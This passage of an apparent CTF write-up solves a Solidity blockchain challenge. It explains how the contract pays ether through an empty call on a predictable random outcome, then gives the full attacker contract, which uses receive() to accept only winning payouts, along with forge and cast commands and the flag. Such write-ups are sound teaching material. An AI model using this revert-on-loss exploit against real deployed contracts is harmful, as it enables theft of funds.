</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#e67e80">function</span> <span style="color:#b2c98f">isSolved</span>() <span style="color:#e67e80">public</span> <span style="color:#e67e80">view</span> <span style="color:#e67e80">returns</span> (<span style="color:#dbbc7f">bool</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#e67e80">return</span> solved;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></td></tr></table>
</div>
</div>
</details>

<h2 id="code-reading">Code reading</h2>
<p>We can notice in the <code>Blessing()</code> function, that to get a blessing, <code>AngelNumber</code> have to be equal to 1 :</p>
<div class="highlight"><div style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">5
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#e67e80">if</span> (AngelNumber <span style="color:#7a8478">==</span> <span style="color:#d699b6">1</span>) {
</span></span><span style="display:flex;"><span>    (<span style="color:#dbbc7f">bool</span> sent, ) <span style="color:#7a8478">=</span> <span style="color:#d699b6">msg</span>.<span style="color:#d699b6">sender</span>.<span style="color:#d699b6">call</span>{<span style="color:#d699b6">value</span><span style="color:#7a8478">:</span> <span style="color:#d699b6">1</span> <span style="color:#e67e80">ether</span>}(<span style="color:#b2c98f">&#34;&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#d699b6">require</span>(sent, <span style="color:#b2c98f">&#34;Failed to send Ether&#34;</span>);
</span></span><span style="display:flex;"><span>    blessings[<span style="color:#d699b6">msg</span>.<span style="color:#d699b6">sender</span>] <span style="color:#7a8478">+=</span> <span style="color:#d699b6">1</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></td></tr></table>
</div>
</div><p>And it&rsquo;s value is computed by generating a &ldquo;random&rdquo; number using known values.</p>
<div class="highlight"><div style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">2
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#dbbc7f">uint256</span> randomNumber <span style="color:#7a8478">=</span> <span style="color:#dbbc7f">uint256</span>(<span style="color:#d699b6">keccak256</span>(<span style="color:#d699b6">abi</span>.<span style="color:#d699b6">encodePacked</span>(seed, <span style="color:#d699b6">msg</span>.<span style="color:#d699b6">sender</span>, <span style="color:#d699b6">block</span>.prevrandao, <span style="color:#d699b6">block</span>.<span style="color:#d699b6">timestamp</span>)));
</span></span><span style="display:flex;"><span><span style="color:#dbbc7f">uint256</span> AngelNumber <span style="color:#7a8478">=</span> randomNumber <span style="color:#7a8478">%</span> <span style="color:#d699b6">2</span>;
</span></span></code></pre></td></tr></table>
</div>
</div><p>But skill issue, I didn&rsquo;t managed to recompute the random value successfully.</p>
<p>However, when getting blessed, a function call is made to msg.sender :</p>
<div class="highlight"><div style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">1
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span>(<span style="color:#dbbc7f">bool</span> sent, ) <span style="color:#7a8478">=</span> <span style="color:#d699b6">msg</span>.<span style="color:#d699b6">sender</span>.<span style="color:#d699b6">call</span>{<span style="color:#d699b6">value</span><span style="color:#7a8478">:</span> <span style="color:#d699b6">1</span> <span style="color:#e67e80">ether</span>}(<span style="color:#b2c98f">&#34;&#34;</span>);
</span></span></code></pre></td></tr></table>
</div>
</div><p>And even if we are not getting blessed :</p>
<div class="highlight"><div style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">1
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span>(<span style="color:#dbbc7f">bool</span> sent, ) <span style="color:#7a8478">=</span> <span style="color:#d699b6">msg</span>.<span style="color:#d699b6">sender</span>.<span style="color:#d699b6">call</span>{<span style="color:#d699b6">value</span><span style="color:#7a8478">:</span> <span style="color:#d699b6">0</span> <span style="color:#e67e80">ether</span>}(<span style="color:#b2c98f">&#34;&#34;</span>);
</span></span></code></pre></td></tr></table>
</div>
</div><p>What is happenings is that a call to &quot;&quot; is made. It could be a call to &ldquo;function1()&rdquo; or whatever but when it&rsquo;s empty, it means that the default function when receiving ether is called which is  either &ldquo;<code>receive()</code>&rdquo; or &ldquo;<code>fallback()</code>&rdquo; :</p>
<pre tabindex="0"><code>                 send Ether
                      |
           msg.data is empty?
                /           \
            yes             no
             |                |
    receive() exists?     fallback()
        /        \
     yes          no
      |            |
  receive()     fallback()
</code></pre><p>Then, to only receive blessing we can make the difference between a blessing and not a blessing (a curse ?), which is receiving or not ether. So, we can write a <code>receive</code> function to only accept blessings :</p>
<div class="highlight"><div style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">4
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span>receive() <span style="color:#e67e80">external</span> <span style="color:#e67e80">payable</span> { 
</span></span><span style="display:flex;"><span>        <span style="color:#d699b6">require</span>(<span style="color:#d699b6">msg</span>.<span style="color:#d699b6">value</span> <span style="color:#7a8478">&gt;=</span> <span style="color:#d699b6">1</span>, <span style="color:#b2c98f">&#34;envoie de la moula frr&#34;</span>);
</span></span><span style="display:flex;"><span>        player.<span style="color:#d699b6">transfer</span>(<span style="color:#dbbc7f">address</span>(<span style="color:#d699b6">this</span>).<span style="color:#d699b6">balance</span>);  
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="../../images/memes/receive-function-money.gif" alt="receive"></p>
<h1 id="solving">Solving</h1>
<p>Now that&rsquo;s the receive function is ready, we can write a contract to which will get the blessings through a <code>GetBlessed()</code> function and make call to it with <a href="https://book.getfoundry.sh/reference/cast/">cast</a></p>
<details>
  <summary style="color: #F99417; cursor: pointer">Solve.sol</summary>
  <div class="highlight"><div style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">17
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">18
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">19
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">20
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">21
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">22
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">23
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">24
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">25
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">26
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">27
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">28
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">29
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">30
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">31
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">32
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">33
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">34
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">35
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">36
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">37
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">38
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">39
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">40
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">41
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#859289;font-style:italic">// SPDX-License-Identifier: MIT
</span></span></span><span style="display:flex;"><span><span style="color:#859289;font-style:italic"></span><span style="color:#e67e80">pragma solidity</span> <span style="color:#7a8478">^</span><span style="color:#d699b6">0</span>.<span style="color:#d699b6">8</span>.<span style="color:#d699b6">0</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#e67e80">import</span> <span style="color:#b2c98f">&#34;./Challenge.sol&#34;</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#e67e80">contract</span> Solve {
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#dbbc7f">address</span> <span style="color:#e67e80">payable</span> <span style="color:#e67e80">public</span> player;
</span></span><span style="display:flex;"><span>    Challenge <span style="color:#e67e80">public</span> TARGET;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#e67e80">event</span> Transac(<span style="color:#dbbc7f">address</span> <span style="color:#d699b6">sender</span>, <span style="color:#dbbc7f">uint</span> amount);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#e67e80">constructor</span>(<span style="color:#dbbc7f">address</span> _player, <span style="color:#dbbc7f">address</span> _target) <span style="color:#e67e80">payable</span>{
</span></span><span style="display:flex;"><span>        player <span style="color:#7a8478">=</span> <span style="color:#e67e80">payable</span>(_player);
</span></span><span style="display:flex;"><span>        TARGET <span style="color:#7a8478">=</span> Challenge(_target);
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#e67e80">function</span> <span style="color:#b2c98f">GetBlessed</span>() <span style="color:#e67e80">public</span> <span style="color:#e67e80">payable</span> {
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#d699b6">require</span>(<span style="color:#d699b6">msg</span>.<span style="color:#d699b6">value</span> <span style="color:#7a8478">==</span> <span style="color:#d699b6">1</span> <span style="color:#e67e80">ether</span>, <span style="color:#b2c98f">&#34;Send exactly 1 Ether!&#34;</span>);
</span></span><span style="display:flex;"><span>        TARGET.Blessing{<span style="color:#d699b6">value</span><span style="color:#7a8478">:</span> <span style="color:#d699b6">msg</span>.<span style="color:#d699b6">value</span>}();
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#e67e80">function</span> <span style="color:#b2c98f">GetBlessings</span>() <span style="color:#e67e80">public</span> <span style="color:#e67e80">payable</span> <span style="color:#e67e80">returns</span> (<span style="color:#dbbc7f">uint256</span>){
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#e67e80">return</span> TARGET.blessings(<span style="color:#dbbc7f">address</span>(<span style="color:#d699b6">this</span>));
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#e67e80">function</span> <span style="color:#b2c98f">ascend</span>() <span style="color:#e67e80">public</span> <span style="color:#e67e80">payable</span> {
</span></span><span style="display:flex;"><span>        TARGET.ascend{<span style="color:#d699b6">value</span><span style="color:#7a8478">:</span> <span style="color:#d699b6">msg</span>.<span style="color:#d699b6">value</span>}();
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    receive() <span style="color:#e67e80">external</span> <span style="color:#e67e80">payable</span> { 
</span></span><span style="display:flex;"><span>        <span style="color:#d699b6">require</span>(<span style="color:#d699b6">msg</span>.<span style="color:#d699b6">value</span> <span style="color:#7a8478">&gt;=</span> <span style="color:#d699b6">1</span>, <span style="color:#b2c98f">&#34;envoie de la moula frr&#34;</span>);
</span></span><span style="display:flex;"><span>        player.<span style="color:#d699b6">transfer</span>(<span style="color:#dbbc7f">address</span>(<span style="color:#d699b6">this</span>).<span style="color:#d699b6">balance</span>);  
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></td></tr></table>
</div>
</div>
</details>

<p>Deploy it and do multiple calls to <code>GetBlessed()</code> until we got to ten blessings :</p>
<div class="highlight"><div style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">1
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>forge create --broadcast breizh/2025/blockchain/mystical-angel/Solve.sol:Solve -r https://mystical-angel-268.chall.ctf.bzh/rpc  --private-key $PKEY --constructor-args $PLAYER $TARGET
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">1
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cast send 0xF14165Da8e14d2AFdF75a448A057D460D13b0242 -r https://mystical-angel-268.chall.ctf.bzh/rpc --value 1ether --private-key $PKEY <span style="color:#b2c98f">&#34;GetBlessed()&#34;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>We can check the number of blessings :</p>
<div class="highlight"><div style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">2
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cast call 0xF14165Da8e14d2AFdF75a448A057D460D13b0242 -r https://mystical-angel-268.chall.ctf.bzh/rpc <span style="color:#b2c98f">&#34;GetBlessings()&#34;</span>
</span></span><span style="display:flex;"><span>0x000000000000000000000000000000000000000000000000000000000000000b
</span></span></code></pre></td></tr></table>
</div>
</div><p>Which is 11, now we can ascend :</p>
<div class="highlight"><div style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">1
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cast send 0xF14165Da8e14d2AFdF75a448A057D460D13b0242 -r https://mystical-angel-268.chall.ctf.bzh/rpc --private-key $PKEY <span style="color:#b2c98f">&#34;ascend()&#34;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>And get the flag :</p>
<p><code>BZHCTF{Ascended_L1k3_4_Mystical_Angel}</code></p>
<h1 id="references">References</h1>
<p><a href="https://solidity-by-example.org/fallback/">https://solidity-by-example.org/fallback/</a></p>
</article>

            </div>
        </main>

  
    </body>
</html>
